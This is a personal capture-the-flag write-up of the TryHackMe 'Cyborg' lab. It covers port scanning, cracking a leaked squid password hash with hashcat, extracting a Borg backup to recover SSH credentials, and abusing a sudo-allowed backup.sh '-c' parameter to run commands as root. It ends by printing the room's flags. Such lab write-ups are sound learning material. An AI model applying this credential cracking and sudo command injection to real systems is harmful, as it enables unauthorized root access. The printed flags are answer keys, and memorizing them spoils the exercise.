---
creation date: May 17th 2023
last modified date: May 17th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Cyborg]]  


# Resolution summary
- Exploited Borg Repo that contained the user Alex's password written in a text file
- Used `sudo -l` found that our user can run `/etc/mp3backups/backup.sh`
- `backup.sh` was readable and showed it ran anything given as a `c` parameter in a CMD root user terminal

## Improved skills
- Need to not zone into one area and explore all avenues
- IF SOMTHING ISNT WORKING IT MIGHT BE BECAUSE ITS NOT GOING TO AND NOT BECAUSE YOU ARENT DOING IT RIGHT!!!!!!

## Used tools
- [[nmap]]
- [[Borg]]
- [[SSH]]

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
- /admin
	- Leads to a site where two admins talk about using squid proxy and having configs still stored on the site somewhere
	- We also find a **.tar** file under music section
		- Downloading and opening shows that we have a [[Borg]] repo based on the README file
		- So this must be what the creds we found under
- /etc
	- Searching Squid proxy shows that it usually stores info in this subdomain so trying it leads us to a password file of: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
		- Cracking that password using [[Hash-Identifier]] shows its a MD5(APR)
		- Putting this into hashcat against the rockyou dictionary reveals the password:
			- `music_archive:squidward`


---

# Exploitation
## Password Saved In Borg Repo
- Using Borg we installed it to our system and used the following command to access it:
```bash
borg extract home/field/dev/final_archive/::music_archive
```
- The `home/field/dev/final_archive/` came from the **.tar** file it contained folders with this structure
- The `music_archive` came from our **/etc** subdomain and we are prompted for a password which we cracked earlier!!!

- Doing this will extract a new path for the user Alex: `/home/alex`
- Searching his folders under `Documents/note.txt` :
```text
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

## SSH Creds
**alex:S3cretP@s3**

## backup.sh Running as Admin??
```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/a$

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
- This is taking a parameter of `c` and passing that through to a **CMD** testing it with:
```bash
sudo /etc/mp3backups/backup.sh -c whoami
```
- Returned: `root`!!! We have access to root commands could open a shell with root user but just located a root.txt under `/root`
```bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c 'cat /root/root.txt'
```
- flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}




---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot
user.txt = flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

root.txt = flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 17th 2023 (09:33 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
